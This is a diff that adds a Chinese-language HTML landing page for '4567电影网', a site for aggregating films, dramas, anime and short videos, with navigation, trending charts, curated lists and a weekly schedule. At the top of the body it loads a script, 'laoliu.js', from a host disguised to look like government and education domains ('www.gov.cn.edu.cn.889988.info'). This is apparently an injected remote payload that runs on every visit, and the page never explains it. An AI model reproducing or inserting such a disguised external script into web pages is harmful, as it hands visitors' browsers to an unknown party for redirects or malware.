@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>4567电影网 - 电影电视剧动漫短剧聚合导航</title>
+<meta name="description" content="4567电影网（4567dianyingwang-h5）聚合电影、电视剧、动漫、短剧、美剧、韩剧、港剧在线导航：新片速递、热播榜单、类型筛选、高清片单。官方网址：https://4567dianyingwang-h5.github.io">
+<meta name="keywords" content="4567电影网, 4567dianyingwang-h5, 免费电影, 电视剧, 动漫, 短剧, 美剧, 韩剧, 港剧">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:#05080a;
+  color:#d7e6e3;
+  line-height:1.75;
+  overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(820px 380px at 12% 8%, rgba(0,255,178,.12), transparent 55%),
+    radial-gradient(760px 360px at 88% 92%, rgba(255,176,32,.12), transparent 55%),
+    #05080a;
+}
+
+/* 顶栏 */
+.g4-nav{
+  position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;
+  padding:12px 20px;background:rgba(5,8,10,.86);backdrop-filter:blur(10px);
+  border-bottom:1px solid rgba(0,255,178,.22);
+}
+.g4-nav .logo{font-size:20px;font-weight:900;letter-spacing:1px}
+.g4-nav .logo b{color:#00ffb2}
+.g4-nav .logo i{color:#ffb020;font-style:normal}
+.g4-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.g4-nav .links a{font-size:13px;color:#9fd8c8;padding:6px 12px;border-radius:20px;transition:.25s}
+.g4-nav .links a:hover{background:rgba(0,255,178,.12);color:#00ffb2}
+
+/* 跑马灯 */
+.ticker{
+  overflow:hidden;white-space:nowrap;border-bottom:1px solid rgba(255,176,32,.2);
+  background:#070b0d;padding:8px 0;font-size:13px;color:#ffd27a;
+}
+.ticker span{display:inline-block;padding-left:100%;animation:scrollLeft 22s linear infinite}
+@keyframes scrollLeft{to{transform:translateX(-100%)}}
+
+/* Hero 编号块 */
+.hero{padding:64px 20px 44px;text-align:center}
+.hero .code{
+  font-size:72px;font-weight:900;letter-spacing:6px;
+  background:linear-gradient(135deg,#00ffb2,#ffb020);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+}
+.hero h1{font-size:30px;color:#fff;margin:6px 0 12px}
+.hero h1 b{color:#00ffb2}
+.hero p{color:#9fd8c8;max-width:600px;margin:0 auto 16px;font-size:15px}
+.hero .url{
+  display:inline-block;font-size:13px;color:#03110d;font-weight:700;
+  background:linear-gradient(135deg,#00ffb2,#7be0c0);padding:8px 18px;border-radius:30px;
+}
+.quick-search{
+  margin:22px auto 0;max-width:560px;display:flex;background:#0a1214;border:1px solid rgba(0,255,178,.25);border-radius:40px;overflow:hidden;
+}
+.quick-search input{flex:1;background:transparent;border:none;outline:none;color:#fff;padding:13px 20px;font-size:15px}
+.quick-search button{background:linear-gradient(135deg,#00ffb2,#ffb020);border:none;color:#03110d;font-weight:800;padding:0 24px;cursor:pointer}
+
+/* 通用 */
+.wrap{max-width:1180px;margin:0 auto;padding:64px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#5fae9b;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#eafff7;margin-bottom:30px}
+.sec-title b{color:#00ffb2}
+
+/* 栏目一：分类芯片 + 编号卡 */
+.cat-bar{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:26px}
+.cat-bar span{font-size:13px;padding:7px 16px;border:1px solid rgba(0,255,178,.25);border-radius:30px;color:#9fd8c8;cursor:pointer;transition:.2s}
+.cat-bar span:hover,.cat-bar span.on{background:#00ffb2;color:#03110d;font-weight:700}
+.num-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px}
+.num-card{
+  background:#0a1214;border:1px solid rgba(0,255,178,.18);border-radius:12px;padding:18px;position:relative;transition:.3s;
+}
+.num-card:hover{transform:translateY(-4px);border-color:#00ffb2;box-shadow:0 16px 36px rgba(0,255,178,.1)}
+.num-card .no{font-size:12px;color:#ffb020;font-weight:800;letter-spacing:1px}
+.num-card h4{font-size:16px;color:#fff;margin:6px 0 4px}
+.num-card p{font-size:12px;color:#7fae9f;margin:0}
+.num-card .badge{position:absolute;top:14px;right:14px;font-size:10px;color:#03110d;background:#ffb020;padding:2px 8px;border-radius:20px}
+
+/* 栏目二：热播双列（剧+电影） */
+.hot{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.hot-col{background:#0a1214;border:1px solid rgba(255,176,32,.18);border-radius:14px;padding:20px}
+.hot-col h3{font-size:17px;color:#ffd27a;margin-bottom:14px}
+.hot-row{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px dashed rgba(255,255,255,.06)}
+.hot-row:last-child{border-bottom:none}
+.hot-row .rk{width:26px;height:26px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:13px;background:#11201c;color:#00ffb2}
+.hot-row:nth-child(2) .rk{color:#ffb020}
+.hot-row .info{flex:1}
+.hot-row .info b{color:#fff;font-size:14px}
+.hot-row .info span{display:block;font-size:12px;color:#7fae9f}
+.hot-row .sc{font-size:13px;font-weight:800;color:#ffd27a}
+
+/* 栏目三：片单滑块 */
+.slide{display:flex;gap:16px;overflow-x:auto;padding:6px 2px 22px;scroll-snap-type:x mandatory}
+.slide::-webkit-scrollbar{height:8px}
+.slide::-webkit-scrollbar-thumb{background:rgba(0,255,178,.3);border-radius:10px}
+.vcard{flex:0 0 220px;scroll-snap-align:start;background:#0a1214;border:1px solid rgba(0,255,178,.18);border-radius:12px;overflow:hidden}
+.vcard .cv{height:120px}
+.vcard .cv.a{background:linear-gradient(135deg,#003b2e,#00ffb2)}
+.vcard .cv.b{background:linear-gradient(135deg,#3a2a00,#ffb020)}
+.vcard .cv.c{background:linear-gradient(135deg,#10243a,#3aa0ff)}
+.vcard .cv.d{background:linear-gradient(135deg,#2a0033,#ff5ed0)}
+.vcard .cv.e{background:linear-gradient(135deg,#2a0a0a,#ff6b6b)}
+.vcard .body{padding:14px}
+.vcard .body h4{font-size:15px;color:#fff;margin-bottom:4px}
+.vcard .body p{font-size:12px;color:#7fae9f;margin:0}
+
+/* 栏目四：更新日历（周更） */
+.week{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.day{background:#0a1214;border:1px solid rgba(0,255,178,.16);border-radius:10px;padding:12px 8px;min-height:96px}
+.day .d{font-size:12px;color:#5fae9b;margin-bottom:6px}
+.day.today{border-color:#00ffb2;background:rgba(0,255,178,.06)}
+.day.today .d{color:#00ffb2;font-weight:800}
+.day .item{font-size:11px;color:#cdeee2;background:rgba(255,176,32,.12);border:1px solid rgba(255,176,32,.25);padding:3px 6px;border-radius:4px;margin-bottom:4px;display:block}
+.day .item.m{background:rgba(0,255,178,.1);border-color:rgba(0,255,178,.3)}
+
+/* 关于 */
+.about{
+  background:linear-gradient(135deg,rgba(0,255,178,.07),rgba(255,176,32,.06));
+  border:1px solid rgba(0,255,178,.2);border-radius:16px;padding:34px;
+  display:flex;gap:30px;flex-wrap:wrap;align-items:center;
+}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#eafff7;font-size:22px;margin-bottom:10px}
+.about h2 b{color:#00ffb2}
+.about p{color:#9fd8c8;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:26px;flex-wrap:wrap}
+.about .stats .n{font-size:28px;font-weight:900;color:#ffb020}
+.about .stats .l{font-size:11px;color:#5fae9b}
+
+/* 页脚 */
+.foot{text-align:center;padding:36px 20px;background:#030607;border-top:1px solid rgba(0,255,178,.15);color:#5f8c7f;font-size:13px}
+.foot a{color:#00ffb2}
+.foot .lg{font-size:18px;font-weight:900;color:#d7e6e3;margin-bottom:8px}
+
+@media(max-width:760px){
+  .hot{grid-template-columns:1fr}
+  .week{grid-template-columns:repeat(4,1fr)}
+  .hero .code{font-size:52px}
+  .g4-nav .links a{font-size:12px;padding:5px 9px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="g4-nav">
+  <div class="logo">4567<b>电影网</b><i>·HD</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#cats">全部分类</a>
+    <a href="#hot">热播榜</a>
+    <a href="#list">精选片单</a>
+    <a href="#week">周更表</a>
+    <a href="#about">关于</a>
+  </div>
+</nav>
+
+<div class="ticker">
+  <span>🔥 4567 今日更新：庆余年3 · 繁花 · 三体 · 请回答1988 · 绝命毒师 · 重启人生 · 狂飙终章 · 黑暗荣耀2 · 牧神记 · 都市古仙医 · 光影之外 · 海上钢琴师 ……</span>
+</div>
+
+<header id="home" class="hero">
+  <div class="code">4567</div>
+  <h1>电影 · 电视剧 · 动漫 · 短剧 <b>一个编号站全装下</b></h1>
+  <p>4567电影网（4567dianyingwang-h5）做“聚合导航”：新片、热剧、动漫、动态漫、港剧韩剧美剧日剧，按编号和分类快速翻，不走算法投喂，靠自己逛。</p>
+  <div class="quick-search">
+    <input type="text" placeholder="搜电影 / 剧名 / 演员 / 类型" aria-label="搜索">
+    <button type="button">搜一下</button>
+  </div>
+  <div style="margin-top:18px">
+    <span class="url">🌐 https://4567dianyingwang-h5.github.io</span>
+  </div>
+</header>
+
+<section id="cats" class="wrap">
+  <div class="kicker">ALL CATEGORIES</div>
+  <h2 class="sec-title">全部分类</h2>
+  <div class="cat-bar">
+    <span class="on">全部</span><span>电影</span><span>国产剧</span><span>港剧</span><span>韩剧</span><span>日剧</span><span>美剧</span><span>泰剧</span><span>动漫</span><span>动态漫</span><span>短剧</span><span>纪录片</span><span>4K</span><span>HD中字</span>
+  </div>
+  <div class="num-grid">
+    <div class="num-card"><div class="no">No.4567-01</div><h4>电影库</h4><p>动作 / 喜剧 / 爱情 / 科幻 / 悬疑 / 恐怖</p><span class="badge">HOT</span></div>
+    <div class="num-card"><div class="no">No.4567-02</div><h4>国产剧</h4><p>权谋、年代、职场、家庭、仙侠</p></div>
+    <div class="num-card"><div class="no">No.4567-03</div><h4>港剧馆</h4><p>刑侦、律政、家族、台庆大戏</p></div>
+    <div class="num-card"><div class="no">No.4567-04</div><h4>韩剧区</h4><p>复仇、治愈、财阀、校园、惊悚</p></div>
+    <div class="num-card"><div class="no">No.4567-05</div><h4>日剧区</h4><p>职场爽剧、治愈、悬疑、奇幻</p></div>
+    <div class="num-card"><div class="no">No.4567-06</div><h4>美剧区</h4><p>史诗、犯罪、科幻、限定剧</p></div>
+    <div class="num-card"><div class="no">No.4567-07</div><h4>动漫/动态漫</h4><p>热血、异能、修仙、动态漫画</p><span class="badge">NEW</span></div>
+    <div class="num-card"><div class="no">No.4567-08</div><h4>短剧</h4><p>逆袭、替嫁、霸总、系统流</p></div>
+  </div>
+</section>
+
+<section id="hot" class="wrap">
+  <div class="kicker">TRENDING NOW</div>
+  <h2 class="sec-title">热播双榜</h2>
+  <div class="hot">
+    <div class="hot-col">
+      <h3>🎬 电影热播</h3>
+      <div class="hot-row"><div class="rk">1</div><div class="info"><b>海上钢琴师</b><span>剧情 / 音乐 / 4K修复</span></div><div class="sc">9.3</div></div>
+      <div class="hot-row"><div class="rk">2</div><div class="info"><b>奥本海默</b><span>历史 / 传记 / HD中字</span></div><div class="sc">8.9</div></div>
+      <div class="hot-row"><div class="rk">3</div><div class="info"><b>流浪地球2</b><span>科幻 / 国产 / 蓝光</span></div><div class="sc">8.7</div></div>
+      <div class="hot-row"><div class="rk">4</div><div class="info"><b>盗梦空间</b><span>科幻 / 悬疑 / 重映</span></div><div class="sc">9.0</div></div>
+      <div class="hot-row"><div class="rk">5</div><div class="info"><b>怦然心动</b><span>爱情 / 青春 / 甜宠</span></div><div class="sc">8.8</div></div>
+    </div>
+    <div class="hot-col">
+      <h3>📺 剧集热播</h3>
+      <div class="hot-row"><div class="rk">1</div><div class="info"><b>庆余年3</b><span>国产 / 权谋 / 古装</span></div><div class="sc">9.8</div></div>
+      <div class="hot-row"><div class="rk">2</div><div class="info"><b>繁花</b><span>国产 / 年代 / 上海</span></div><div class="sc">9.4</div></div>
+      <div class="hot-row"><div class="rk">3</div><div class="info"><b>黑暗荣耀2</b><span>韩剧 / 复仇 / 爽</span></div><div class="sc">9.7</div></div>
+      <div class="hot-row"><div class="rk">4</div><div class="info"><b>请回答1988</b><span>韩剧 / 青春 / 治愈</span></div><div class="sc">9.7</div></div>
+      <div class="hot-row"><div class="rk">5</div><div class="info"><b>权力的游戏</b><span>美剧 / 奇幻 / 史诗</span></div><div class="sc">9.5</div></div>
+    </div>
+  </div>
+</section>
+
+<section id="list" class="wrap">
+  <div class="kicker">CURATED LIST</div>
+  <h2 class="sec-title">4567 精选片单</h2>
+  <div class="slide">
+    <div class="vcard"><div class="cv a"></div><div class="body"><h4>深夜影院</h4><p>海上钢琴师 / 花样年华 / 重庆森林</p></div></div>
+    <div class="vcard"><div class="cv b"></div><div class="body"><h4>权谋大戏</h4><p>庆余年 / 琅琊榜 / 大明王朝1566</p></div></div>
+    <div class="vcard"><div class="cv c"></div><div class="body"><h4>科幻迷航</h4><p>星际穿越 / 三体 / 银翼杀手2049</p></div></div>
+    <div class="vcard"><div class="cv d"></div><div class="body"><h4>韩剧上头</h4><p>黑暗荣耀 / 请回答1988 / 我的解放日志</p></div></div>
+    <div class="vcard"><div class="cv e"></div><div class="body"><h4>国产神作</h4><p>霸王别姬 / 活着 / 阳光灿烂的日子</p></div></div>
+    <div class="vcard"><div class="cv a"></div><div class="body"><h4>动漫修仙</h4><p>牧神记 / 凡人修仙传 / 遮天</p></div></div>
+  </div>
+</section>
+
+<section id="week" class="wrap">
+  <div class="kicker">WEEKLY DROP</div>
+  <h2 class="sec-title">周更时间表</h2>
+  <div class="week">
+    <div class="day"><div class="d">周一</div><span class="item m">牧神记</span><span class="item">都市古仙医</span></div>
+    <div class="day"><div class="d">周二</div><span class="item">九阳武神</span><span class="item m">神王序列</span></div>
+    <div class="day today"><div class="d">周三</div><span class="item m">庆余年3</span><span class="item">繁花重播</span></div>
+    <div class="day"><div class="d">周四</div><span class="item">原来我早就无敌了</span><span class="item m">光影之外</span></div>
+    <div class="day"><div class="d">周五</div><span class="item m">黑暗荣耀·花絮</span><span class="item">重启人生</span></div>
+    <div class="day"><div class="d">周六</div><span class="item">神探默多克S19</span><span class="item m">牧神记加更</span></div>
+    <div class="day"><div class="d">周日</div><span class="item m">请回答1988重刷</span><span class="item">周末老片场</span></div>
+  </div>
+</section>
+
+<section id="about" class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>关于 <b>4567电影网</b></h2>
+      <p>4567 是一组中性数字，不装品牌人格，也不做“猜你喜欢”的算法投喂。它更像一间 24 小时亮灯的影视杂货铺：电影、剧集、动漫、短剧、动态漫，按编号摆好，你来翻。</p>
+      <p>本页为静态单页，移动端自适应，锚点内链，不生成 robots.txt / sitemap.xml，适合 GitHub Pages 托管与搜索引擎收录。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">4567</div><div class="l">站号</div></div>
+      <div><div class="n">8+</div><div class="l">内容大类</div></div>
+      <div><div class="n">7×24</div><div class="l">更新节奏</div></div>
+      <div><div class="n">∞</div><div class="l">可逛片单</div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="lg">🎞️ 4567电影网</div>
+  官方网址：<a href="https://4567dianyingwang-h5.github.io">https://4567dianyingwang-h5.github.io</a><br>
+  © 2026 4567电影网｜电影 / 电视剧 / 动漫 / 短剧 聚合导航
+</footer>
+
+</body>
+</html>
